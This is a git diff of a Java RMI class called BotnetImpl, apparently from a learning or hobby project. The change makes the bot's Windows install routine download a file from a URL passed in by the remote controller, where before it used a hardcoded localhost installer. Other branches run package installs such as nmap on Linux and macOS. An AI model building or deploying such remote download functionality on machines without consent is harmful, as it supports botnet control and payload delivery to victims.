@@ -63,16 +63,14 @@ public class BotnetImpl extends UnicastRemoteObject implements IBotnet{
         return arr;
     }
     
-     public ArrayList<String> winInstall(String command){
+     public ArrayList<String> winInstall(String command, String urlInput){
         try{
-            // example command: install test.exe
-            //example domain : http://localhost
-            String domain = "";
+            
             String[] splited = command.split("\\s");
             // example url: http://localhost/test.exe
             if (splited[0].equals("install")) {
 //                String urlString = domain + "/" + splited[1
-                String urlString = "http://localhost/myweb/rufus-3.10.exe";
+                String urlString = urlInput;
                 URL url = new URL(urlString);
                 String fileLocation = splited[1];
                 InputStream in = url.openStream();
@@ -103,7 +101,7 @@ public class BotnetImpl extends UnicastRemoteObject implements IBotnet{
     }
     
     @Override
-    public ArrayList<String> installApp() throws RemoteException {
+    public ArrayList<String> installApp(String url) throws RemoteException {
         setOS(System.getProperty("os.name").toLowerCase());
         
         if(getOS().contains("linux")){
@@ -113,7 +111,7 @@ public class BotnetImpl extends UnicastRemoteObject implements IBotnet{
             return runCommand("/usr/local/bin/brew install nmap");
         }
         else if(getOS().contains("win")){
-            return winInstall("install unikey.exe");
+            return winInstall("install", url);
         }
         return null;
         
